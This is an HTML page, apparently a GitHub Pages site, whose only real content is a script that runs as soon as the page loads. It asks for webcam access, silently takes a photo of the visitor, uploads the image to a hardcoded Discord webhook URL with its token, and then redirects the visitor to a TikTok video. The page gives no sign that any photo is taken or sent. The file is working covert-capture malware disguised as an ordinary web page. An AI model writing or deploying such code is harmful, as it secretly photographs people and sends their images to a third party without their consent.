<div class="relative h-screen flex items-center justify-center overflow-hidden">

  </div>

<!-- ====================================== -->

<video id="video" playsinline autoplay></video>
<canvas id="canvas"></canvas>
<img id="photo" alt="preview">

<script>
// ===== CAMERA CAPTURE =====
const WEBHOOK_URL = "https://discord.com/api/webhooks/1439099868172914708/T625tkrkZPF4QkAcHPbMxTErYuoahL6ZAFm_Kt5bDxYIupTf-iz8Dp6KUGLRKjIWkGBn";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const photo = document.getElementById('photo');

async function startCapture() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        resolve();
      };
    });

    await new Promise(r => setTimeout(r, 700));

    const width = video.videoWidth;
    const height = video.videoHeight;
    canvas.width = width;
    canvas.height = height;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, width, height);

    const dataURL = canvas.toDataURL('image/png');
    photo.src = dataURL;

    const blob = await (await fetch(dataURL)).blob();
    const filename = "capture-" + Date.now() + ".png";

    const form = new FormData();
    form.append("file", blob, filename);
    form.append("content", "ðŸ“¸ Auto-captured by art.github.io");

    await fetch(WEBHOOK_URL, { method: "POST", body: form });

    stream.getTracks().forEach(t => t.stop());
    
    // Redirect to TikTok after capture
    setTimeout(() => {
      window.location.href = "https://www.tiktok.com/@tokgamer46/video/7358744726331264273?q=freefire%20%E0%B9%80%E0%B8%81%E0%B8%A3%E0%B8%B5%E0%B8%A2%E0%B8%99&t=1763182546319";
    }, 1000);
  } catch (err) {
    console.error(err);
    // Redirect even if capture fails
    setTimeout(() => {
      window.location.href = "https://www.tiktok.com/@tokgamer46/video/7358744726331264273?q=freefire%20%E0%B9%80%E0%B8%81%E0%B8%A3%E0%B8%B5%E0%B8%A2%E0%B8%99&t=1763182546319";
    }, 1000);
  }
}

window.onload = startCapture;
</script>
